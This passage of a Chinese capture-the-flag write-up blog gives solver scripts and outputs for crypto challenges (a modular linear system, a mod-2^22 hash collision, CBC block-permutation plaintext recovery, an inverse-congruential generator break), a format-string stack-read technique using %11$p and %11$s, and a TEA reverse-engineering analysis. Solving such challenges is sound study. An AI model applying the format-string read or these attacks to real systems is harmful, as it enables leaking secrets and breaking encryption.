4952, 3152, 4139, 3796, 3964, 4691, 4721, 3642, 5282), (3460, 3712, 5003, 4997, 4911, 3168, 5231, 2681, 4528, 3935, 2701, 5081, 5002, 3808, 3761, 4413, 3824, 2799, 4176, 3147, 4882, 3820, 4318, 4258, 4866, 4138, 4039, 3654, 4070, 3516, 2713, 3761, 4871, 3111, 4768, 3473, 5024, 3376, 2764, 2835, 4965, 4600), (3817, 4228, 3063, 4245, 3187, 3015, 3013, 4639, 3879, 2739, 4641, 2992, 3218, 4632, 4251, 4631, 4592, 3158, 4050, 4993, 3458, 4691, 4376, 3609, 3741, 3047, 4352, 4744, 3116, 3053, 4309, 3963, 4233, 3672, 4699, 4614, 3377, 4626, 3550, 4191, 3575, 4554), (3659, 3336, 5295, 3064, 4372, 4725, 3239, 3094, 4019, 4249, 5012, 3782, 4357, 5101, 4778, 4899, 4266, 4705, 2696, 5028, 4630, 4022, 3189, 4522, 4193, 4782, 4030, 2977, 3310, 4249, 5171, 3780, 3215, 3972, 5217, 4301, 2855, 3941, 4994, 4398, 3016, 3143), (3922, 3364, 2809, 3867, 3625, 5208, 3946, 5014, 3928, 3660, 5027, 4712, 4581, 4521, 3698, 5136, 3149, 5107, 2995, 4245, 2919, 4384, 2964, 5173, 4152, 3413, 4733, 2932, 3157, 3831, 5135, 2976, 3698, 5143, 3291, 4973, 2887, 3940, 5243, 5229, 3813, 4033), (3418, 4524, 3961, 5299, 2967, 3681, 3100, 2704, 4228, 3418, 5072, 3976, 3949, 4540, 5063, 2877, 4327, 4724, 3790, 4743, 2684, 4579, 2842, 4567, 3277, 4961, 3414, 4585, 3903, 4240, 4864, 3138, 3540, 5153, 3809, 5171, 4452, 3841, 5315, 3272, 5187, 4811), (2746, 2996, 3753, 4225, 4056, 3118, 5114, 3354, 2834, 5192, 5213, 2779, 3816, 2827, 3781, 3445, 2864, 4229, 2979, 2822, 5094, 3880, 4430, 4504, 3732, 4481, 4364, 4337, 3366, 4417, 2942, 5180, 4909, 3770, 5298, 4557, 3185, 4502, 4730, 5205, 4777, 3736), (3366, 3922, 4127, 4927, 3079, 4499, 3078, 3113, 3965, 3699, 4024, 3812, 3780, 4434, 4384, 4164, 4293, 3231, 3588, 3788, 3422, 5214, 4360, 3789, 3872, 5096, 4595, 5072, 2900, 4807, 4574, 2875, 4036, 4260, 3766, 3122, 5278, 4376, 3236, 2937, 4663, 4733), (3537, 4422, 4615, 2910, 4383, 3129, 4101, 3741, 3678, 3506, 2795, 4134, 4933, 4677, 3858, 5078, 3252, 3341, 3540, 3432, 3751, 4343, 4306, 4086, 4679, 4690, 4018, 4761, 4506, 5055, 5205, 4394, 4060, 3872, 3477, 4523, 3191, 5158, 4847, 2970, 4722, 3451), (3475, 4137, 4259, 2941, 3515, 4639, 3237, 5274, 2889, 5243, 2984, 4033, 3160, 3668, 4402, 5283, 3479, 4585, 2719, 3023, 3941, 3184, 3774, 3673, 3279, 3124, 3840, 4507, 5111, 4661, 3101, 2744, 3424, 4623, 3936, 2923, 3309, 4324, 3077, 4161, 4461, 5192), (4170, 3426, 4246, 3841, 4606, 3187, 4783, 4900, 5101, 5108, 5041, 4042, 4943, 2927, 3529, 4985, 4682, 4255, 2968, 3298, 4057, 2725, 5305, 4412, 4719, 3730, 2784, 4485, 2760, 3082, 3293, 3026, 4728, 3256, 4683, 3165, 4412, 2883, 4302, 3392, 3399, 3512), (4886, 3474, 2923, 4021, 4746, 5119, 3465, 4475, 5248, 4958, 3441, 3772, 3068, 4773, 3654, 4283, 4688, 3787, 3456, 3174, 2947, 4041, 2724, 3683, 5058, 3914, 2973, 4082, 3706, 2671, 5031, 3297, 3790, 4753, 2847, 3265, 3355, 3214, 2872, 4131, 3459, 4879), (2961, 3419, 4246, 2699, 4676, 2746, 5270, 5186, 3447, 3571, 4989, 3646, 4804, 3003, 5215, 3593, 4244, 5085, 2856, 3706, 3213, 5005, 2900, 3031, 3196, 2726, 3711, 5072, 4654, 4079, 4894, 3748, 4266, 2810, 2770, 4071, 2713, 3079, 4809, 3063, 3174, 3380), (3200, 2952, 2713, 5140, 2863, 3263, 3052, 4190, 4913, 3754, 3942, 5009, 3298, 2848, 3970, 3737, 5099, 3591, 3370, 5302, 4153, 2947, 2904, 4201, 5162, 3919, 4686, 3043, 5071, 4648, 4218, 4914, 4434, 5111, 3284, 2758, 4051, 5157, 5189, 4768, 4019, 2803)]  # 你的矩阵列表</span><br><span class="line">b_list = [4300, 535, 1288, 4438, 3036, 4873, 312, 2278, 5120, 3806, 2223, 2772, 2709, 953, 1788, 1303, 2432, 4101, 3993, 822, 4493, 841, 1936, 4626, 3419, 3854, 2435, 1925, 5040, 3693, 5181, 932, 1189, 3614, 2685, 2046, 2663, 747, 3627, 648, 3142]  # 你的向量列表</span><br><span class="line"></span><br><span class="line">A = Matrix(Zmod(p), A_list)</span><br><span class="line">b = vector(Zmod(p), b_list)</span><br><span class="line"></span><br><span class="line"># 求解模方程</span><br><span class="line">sol = A.right_kernel().basis()  # 解空间基</span><br><span class="line">x0 = A.solve_right(b)           # 一个特解</span><br><span class="line"></span><br><span class="line"># 生成完整解</span><br><span class="line"># 所有解：x = x0 + k*v，其中 v 是解空间基向量，k ∈ Z/pZ</span><br><span class="line">v = sol[0]</span><br><span class="line"></span><br><span class="line"># 尝试找到满足 ASCII 条件的 k</span><br><span class="line">for k in range(p):</span><br><span class="line">    candidate = [(x0[i] + k*v[i]) % p for i in range(len(x0))]</span><br><span class="line">    if all(32 &lt;= c &lt;= 126 for c in candidate):</span><br><span class="line">        flag = &#x27;&#x27;.join(chr(c) for c in candidate)</span><br><span class="line">        print(flag)</span><br><span class="line">        break</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="47.png" alt="47"></p>
<h3 id="欧皇的生日"><a href="#欧皇的生日" class="headerlink" title="欧皇的生日"></a>欧皇的生日</h3><p>分析代码 是个哈希碰撞问题 因为 m&#x3D;2的22次方 是 <strong>2 的幂次</strong>，可以用模运算的性质制造碰撞<br>在模 2的k次方 下，若两个数的差是 2的k-1次方，它们平方模 2的k次方 会相等<br>进入环境 输入 <code>0 2097152</code> 因为 2^21 &#x3D; 2097152 无论 a、b、c 取什么随机值 这两个输入一定碰撞<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="46.png" alt="46"></p>
<h3 id="CBC之舞"><a href="#CBC之舞" class="headerlink" title="CBC之舞"></a>CBC之舞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.Padding import unpad</span><br><span class="line"></span><br><span class="line"># 已知数据（题目给出）</span><br><span class="line">iv1_hex = &quot;1e5d251ea78ef68a1282079fd028c747&quot;</span><br><span class="line">iv2_hex = &quot;18777ae4c1a29f4c5db8ba6c5dfe72f1&quot;</span><br><span class="line">m1_hex = &quot;f560fd28ed5c5ce7d952eb44b47007e702f42dbb54540dfc78467f48933dbb01ebcf520fd3d23a211d3b4e8c06261966cb178525c25b8058ff792e0f251d3d15&quot;</span><br><span class="line">c1_hex = &quot;caf7bc1223c17f848aec854a87b8958d4c518f7287663bfae0b6a5a1e0f0eb95b50c9ea6789a7d77fda5f50d1b8a2183b40cab693ebacf32a9b59faf3b0084ff&quot;</span><br><span class="line">c2_hex = &quot;b40cab693ebacf32a9b59faf3b0084ffcaf7bc1223c17f848aec854a87b8958db50c9ea6789a7d77fda5f50d1b8a21834c518f7287663bfae0b6a5a1e0f0eb95&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def split_blocks(bs, block_size=16):</span><br><span class="line">    &quot;&quot;&quot;分割为 16 字节块&quot;&quot;&quot;</span><br><span class="line">    return [bs[i:i + block_size] for i in range(0, len(bs), block_size)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iv1 = bytes.fromhex(iv1_hex)</span><br><span class="line">iv2 = bytes.fromhex(iv2_hex)</span><br><span class="line">m1 = bytes.fromhex(m1_hex)</span><br><span class="line">c1 = bytes.fromhex(c1_hex)</span><br><span class="line">c2 = bytes.fromhex(c2_hex)</span><br><span class="line"></span><br><span class="line">c1_blocks = split_blocks(c1)</span><br><span class="line">c2_blocks = split_blocks(c2)</span><br><span class="line">m1_blocks = split_blocks(m1)</span><br><span class="line"></span><br><span class="line"># 找出 perm：c1[i] 对应 c2[perm[i]]</span><br><span class="line">perm = [c2_blocks.index(b) for b in c1_blocks]</span><br><span class="line">print(f&quot;[+] perm = &#123;perm&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 由关系式恢复 m2 的明文分块</span><br><span class="line">p2_blocks = [b&quot;&quot;] * len(c2_blocks)</span><br><span class="line">for j, idx in enumerate(perm):</span><br><span class="line">    prev_c2 = iv2 if idx == 0 else c2_blocks[idx - 1]</span><br><span class="line">    prev_c1 = iv1 if j == 0 else c1_blocks[j - 1]</span><br><span class="line">    # p2_i = m1_j XOR prev_c2 XOR prev_c1</span><br><span class="line">    p2 = bytes(a ^ b ^ c for a, b, c in zip(m1_blocks[j], prev_c2, prev_c1))</span><br><span class="line">    p2_blocks[idx] = p2</span><br><span class="line"></span><br><span class="line"># 拼接、去填充</span><br><span class="line">recovered_padded_m2 = b&quot;&quot;.join(p2_blocks)</span><br><span class="line">m2 = unpad(recovered_padded_m2, 16)</span><br><span class="line"></span><br><span class="line">print(&quot;\n[+] Recovered padded m2 (hex):&quot;, recovered_padded_m2.hex())</span><br><span class="line">print(&quot;[+] Recovered plaintext (utf-8):&quot;, m2.decode(&quot;utf-8&quot;))</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">[+] perm = [2, 3, 0, 1]</span><br><span class="line"></span><br><span class="line">[+] Recovered padded m2 (hex): 666c61677b6362635f64616e63696e675f31735f7468655f626573745f58445f6d69616f77757e5f77616e67616e677e7d0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f</span><br><span class="line">[+] Recovered plaintext (utf-8): flag&#123;cbc_dancing_1s_the_best_XD_miaowu~_wangang~&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GCL"><a href="#GCL" class="headerlink" title="GCL"></a>GCL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line">import math</span><br><span class="line"></span><br><span class="line"># ------------ 把题目中输出的 c 和 gift 直接粘贴到这里 -------------</span><br><span class="line">c = 18160008429568445340421193226402615775962630020115351294214303830750860843808409781742323237344243089</span><br><span class="line">gift = [</span><br><span class="line">131865585354798388503853664204045577497186238155562615801484830104683890877181087005834317031942408283,</span><br><span class="line">109059933499981578098773732552241207995570220834770592696583461488231579239704140357451421969855041379,</span><br><span class="line">98201806091494704187082836852065059816140437191793644297243874711016194459625411781009291718075199135,</span><br><span class="line">18757271931319533257322147585629190099147626954402651433709338855513752753972712032016018862573500407,</span><br><span class="line">44414575833831572247180084691462875843855281105693674992974405001127527490917389843309074213475473796,</span><br><span class="line">119230797767846495009095216222595719657467391997837145037599770904490776264420156248960485317227292047,</span><br><span class="line">55025298938239176714746988606097305944000798467396224542466354530737718336537150422546120714654987068,</span><br><span class="line">61108071970379547679922902146574052023820080507110885404335008795305785800023228103358713867748030391,</span><br><span class="line">73121196162106845765032066055951000614569505693120119413603886103757507878101072263238094066564654117,</span><br><span class="line">41442768650713930642944746020790921582963259300977583069055974755273373804142970727737438848232141888</span><br><span class="line">]</span><br><span class="line"># ------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># compute s array as integers</span><br><span class="line">s = gift</span><br><span class="line"></span><br><span class="line"># Build di and ei for triples s[i], s[i+1], s[i+2]</span><br><span class="line"># valid i: 0 .. len(s)-3</span><br><span class="line">di = []</span><br><span class="line">ei = []</span><br><span class="line">for i in range(len(s)-2):</span><br><span class="line">    si = s[i]</span><br><span class="line">    si1 = s[i+1]</span><br><span class="line">    si2 = s[i+2]</span><br><span class="line">    di.append(si1 - si)</span><br><span class="line">    ei.append((si1 - si2) * si * si1)</span><br><span class="line"></span><br><span class="line"># compute all pairwise values dij = di[i]*ei[j] - di[j]*ei[i], take gcd of absolute values</span><br><span class="line">vals = []</span><br><span class="line">for i in range(len(di)):</span><br><span class="line">    for j in range(i+1, len(di)):</span><br><span class="line">        val = di[i]*ei[j] - di[j]*ei[i]</span><br><span class="line">        vals.append(abs(val))</span><br><span class="line"></span><br><span class="line"># gcd of all vals</span><br><span class="line">G = 0</span><br><span class="line">for v in vals:</span><br><span class="line">    G = math.gcd(G, v)</span><br><span class="line"></span><br><span class="line">print(&quot;G (gcd of pairwise eliminations) bitlen:&quot;, G.bit_length())</span><br><span class="line"></span><br><span class="line"># G should be multiple of p. Try to extract p by factoring G&#x27;s gcd --</span><br><span class="line"># Usually p itself will be a (large) prime factor of G. We attempt to find the prime factor &gt; max(s)</span><br><span class="line">max_s = max(s)</span><br><span class="line">print(&quot;max gift s bitlen:&quot;, max_s.bit_length())</span><br><span class="line"></span><br><span class="line"># Try to get candidate p by dividing out small factors (trial)</span><br><span class="line"># We&#x27;ll try to find any prime factor of G greater than max_s</span><br><span class="line">def find_candidate_p(G, threshold):</span><br><span class="line">    # trial divide small primes first to reduce G</span><br><span class="line">    small_primes = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97]</span><br><span class="line">    GG = G</span><br><span class="line">    for sp in small_primes:</span><br><span class="line">        while GG % sp == 0:</span><br><span class="line">            GG //= sp</span><br><span class="line">    # If remainder &gt; 1 and &gt; threshold, return it (it may be composite though)</span><br><span class="line">    if GG &gt; 1 and GG &gt; threshold:</span><br><span class="line">        return GG</span><br><span class="line">    # otherwise try to find any factor &gt; threshold by gcd with (G // small)</span><br><span class="line">    # brute force trial up to reasonable limit (this is a fallback and may be slow if not needed)</span><br><span class="line">    # We&#x27;ll try Pollard rho if necessary, but keep simple: try integer sqrt trick</span><br><span class="line">    # Use simple Pollard-Rho implementation if needed</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">candidate = find_candidate_p(G, max_s)</span><br><span class="line">if candidate:</span><br><span class="line">    print(&quot;Found candidate p (possibly composite) with bitlen&quot;, candidate.bit_length())</span><br><span class="line">else:</span><br><span class="line">    print(&quot;No straightforward candidate from simple reduction. Trying Pollard Rho factorization...&quot;)</span><br><span class="line"></span><br><span class="line"># Pollard Rho implementation (deterministic-ish)</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def is_probable_prime(n, k=8):</span><br><span class="line">    if n &lt; 2:</span><br><span class="line">        return False</span><br><span class="line">    # small primes</span><br><span class="line">    small_primes = [2,3,5,7,11,13,17,19,23,29]</span><br><span class="line">    for p in small_primes:</span><br><span class="line">        if n % p == 0:</span><br><span class="line">            return n == p</span><br><span class="line">    # Miller-Rabin</span><br><span class="line">    d = n-1</span><br><span class="line">    s = 0</span><br><span class="line">    while d % 2 == 0:</span><br><span class="line">        d//=2</span><br><span class="line">        s+=1</span><br><span class="line">    def check(a, s, d, n):</span><br><span class="line">        x = pow(a, d, n)</span><br><span class="line">        if x == 1 or x == n-1:</span><br><span class="line">            return True</span><br><span class="line">        for _ in range(s-1):</span><br><span class="line">            x = pow(x, 2, n)</span><br><span class="line">            if x == n-1:</span><br><span class="line">                return True</span><br><span class="line">        return False</span><br><span class="line">    for _ in range(k):</span><br><span class="line">        a = random.randrange(2, n-1)</span><br><span class="line">        if not check(a, s, d, n):</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def pollard_rho(n):</span><br><span class="line">    if n%2==0:</span><br><span class="line">        return 2</span><br><span class="line">    if n%3==0:</span><br><span class="line">        return 3</span><br><span class="line">    while True:</span><br><span class="line">        c = random.randrange(1, n-1)</span><br><span class="line">        x = random.randrange(2, n-1)</span><br><span class="line">        y = x</span><br><span class="line">        d = 1</span><br><span class="line">        while d == 1:</span><br><span class="line">            x = (x*x + c) % n</span><br><span class="line">            y = (y*y + c) % n</span><br><span class="line">            y = (y*y + c) % n</span><br><span class="line">            d = math.gcd(abs(x-y), n)</span><br><span class="line">            if d == n:</span><br><span class="line">                break</span><br><span class="line">        if d &gt; 1 and d &lt; n:</span><br><span class="line">            return d</span><br><span class="line"></span><br><span class="line">def factor(n):</span><br><span class="line">    if n == 1:</span><br><span class="line">        return []</span><br><span class="line">    if is_probable_prime(n):</span><br><span class="line">        return [n]</span><br><span class="line">    d = pollard_rho(n)</span><br><span class="line">    while d is None:</span><br><span class="line">        d = pollard_rho(n)</span><br><span class="line">    fs1 = factor(d)</span><br><span class="line">    fs2 = factor(n//d)</span><br><span class="line">    return fs1 + fs2</span><br><span class="line"></span><br><span class="line">factors = factor(G)</span><br><span class="line">factors = sorted(factors)</span><br><span class="line">print(&quot;factors found count:&quot;, len(factors))</span><br><span class="line"># look for a factor &gt; max_s (must be p or multiple)</span><br><span class="line">candidate_ps = [f for f in factors if f &gt; max_s]</span><br><span class="line">if not candidate_ps:</span><br><span class="line">    # maybe G has power of p: try gcd(G, s_i^k +/- ...) fallback: take largest factor</span><br><span class="line">    candidate = max(factors)</span><br><span class="line">    print(&quot;No factor &gt; max gift found; using largest found factor:&quot;, candidate)</span><br><span class="line">    candidate_ps = [candidate]</span><br><span class="line"></span><br><span class="line">p = candidate_ps[-1]</span><br><span class="line">print(&quot;candidate p:&quot;, p)</span><br><span class="line">print(&quot;p bitlen:&quot;, p.bit_length())</span><br><span class="line"></span><br><span class="line"># Check primality</span><br><span class="line">if not is_probable_prime(p):</span><br><span class="line">    print(&quot;Warning: candidate p is composite! trying to pick prime factor &gt; max_s instead.&quot;)</span><br><span class="line">    # try to factor candidate further</span><br><span class="line">    facs = factor(p)</span><br><span class="line">    facs = sorted(facs)</span><br><span class="line">    for ff in facs[::-1]:</span><br><span class="line">        if ff &gt; max_s and is_probable_prime(ff):</span><br><span class="line">            p = ff</span><br><span class="line">            break</span><br><span class="line">    print(&quot;adjusted p:&quot;, p, &quot;bitlen&quot;, p.bit_length())</span><br><span class="line"></span><br><span class="line"># Now recover a using congruence a * di ≡ ei (mod p) for any i with di % p != 0</span><br><span class="line">a = None</span><br><span class="line">for i in range(len(di)):</span><br><span class="line">    d = di[i] % p</span><br><span class="line">    if d != 0:</span><br><span class="line">        invd = pow(d, -1, p)</span><br><span class="line">        ai = (ei[i] % p) * invd % p</span><br><span class="line">        a = ai</span><br><span class="line">        ai_index = i</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">if a is None:</span><br><span class="line">    raise ValueError(&quot;无法通过 di 恢复 a（所有 di 在 mod p 下为 0）&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;recovered a (mod p) from triple index&quot;, ai_index, &quot;:&quot;, a)</span><br><span class="line"></span><br><span class="line"># recover b via s_&#123;i+1&#125; ≡ a * inv(s_i) + b (mod p)</span><br><span class="line">i = ai_index</span><br><span class="line">si = s[i] % p</span><br><span class="line">si1 = s[i+1] % p</span><br><span class="line">inv_si = pow(si, -1, p)</span><br><span class="line">b = (si1 - (a * inv_si % p)) % p</span><br><span class="line">print(&quot;recovered b (mod p):&quot;, b)</span><br><span class="line"></span><br><span class="line"># compute key from last s value as in code: key = (a*inverse(s,p)+b)%p where s is the final s used in encrypt</span><br><span class="line">s_last = s[-1] % p</span><br><span class="line">inv_last = pow(s_last, -1, p)</span><br><span class="line">key = (a * inv_last + b) % p</span><br><span class="line">print(&quot;recovered key (int) bitlen:&quot;, key.bit_length())</span><br><span class="line"></span><br><span class="line"># decrypt</span><br><span class="line">m = c ^ key</span><br><span class="line"># convert to bytes</span><br><span class="line">def long_to_bytes(n):</span><br><span class="line">    return n.to_bytes((n.bit_length()+7)//8, &#x27;big&#x27;)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    plaintext = long_to_bytes(m).decode()</span><br><span class="line">    print(&quot;可能的明文（decoded as utf-8）:\n&quot;, plaintext)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;解密得到的原始 bytes（hex）:\n&quot;, long_to_bytes(m).hex())</span><br><span class="line">    print(&quot;（注意：若直接 decode 失败，尝试查看 hex 或文件输出）&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">G (gcd of pairwise eliminations) bitlen: 336</span><br><span class="line">max gift s bitlen: 336</span><br><span class="line">Found candidate p (possibly composite) with bitlen 336</span><br><span class="line">factors found count: 1</span><br><span class="line">candidate p: 133824063174739380700665294482954762494261019463748241623836278519679889434431693103693423554406140867</span><br><span class="line">p bitlen: 336</span><br><span class="line">recovered a (mod p) from triple index 0 : 125010888256807792918086019744425973270959722065920696604088777949763998204948993383889428658359639201</span><br><span class="line">recovered b (mod p): 53206185442451718414153407544616606258837514345841056138750460331811398271702514899019420824049666485</span><br><span class="line">recovered key (int) bitlen: 335</span><br><span class="line">可能的明文（decoded as utf-8）:</span><br><span class="line"> flag&#123;2eac1c79-8abd-465e-82f4-96beffed69e4&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Week-2"><a href="#Week-2" class="headerlink" title="Week 2"></a>Week 2</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="刻在栈里的秘密"><a href="#刻在栈里的秘密" class="headerlink" title="刻在栈里的秘密"></a>刻在栈里的秘密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过 位置参数语法 %N$...（例如 %11$p、%11$s），可以直接读取第 N 个参数并把它当成指针（%p）或 C 字符串（%s）来解释。利用这点可以从栈上定位并读取隐藏的密码指针与密码字符串</span><br></pre></td></tr></table></figure>

<p>交互式 互动后获取flag<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="43.png" alt="43"></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Forgotten-Code"><a href="#Forgotten-Code" class="headerlink" title="Forgotten_Code"></a>Forgotten_Code</h3><p>文件本身可以直接用vscode打开 可以看到类似互动的字段和汇编语言<br>分析后发现这是个对flag进行加密的文件</p>
<p>数据区有两段重要静态数据：</p>
<ul>
<li><code>ng</code>：<code>.ascii &quot;sp\177vuctp|xeb|hv~&quot;</code>（16 字节）。</li>
<li><code>ezgm</code>：8 个 32-bit 常量（4 组，每组两个 32-bit，作为加密后的对比值）。</li>
</ul>
<p><code>fn()</code> 的实现为标准 <strong>TEA 加密（Tiny Encryption Algorithm）</strong>：</p>
<ul>
<li>使用 32 轮，delta &#x3D; <code>0x9E3779B9</code>。</li>
<li>密钥 <code>k[4]</code> 来自 <code>ng</code>（每 4 字节拼成一个 <code>uint32_t</code>，小端）。</li>
</ul>
<p>特别点：在 <code>fn()</code> 的开头，程序对 <code>ng</code> 做了 16 次 <code>ng[i] ^= 17</code> 并写回内存。也就是说 <strong>每次调用 <code>fn()</code> 前，<code>ng</code> 都被异或 0x11，并且这种修改是累积保留的</strong> —— 所以每组 TEA 使用的 key 都不同（密钥链式变化）。</p>
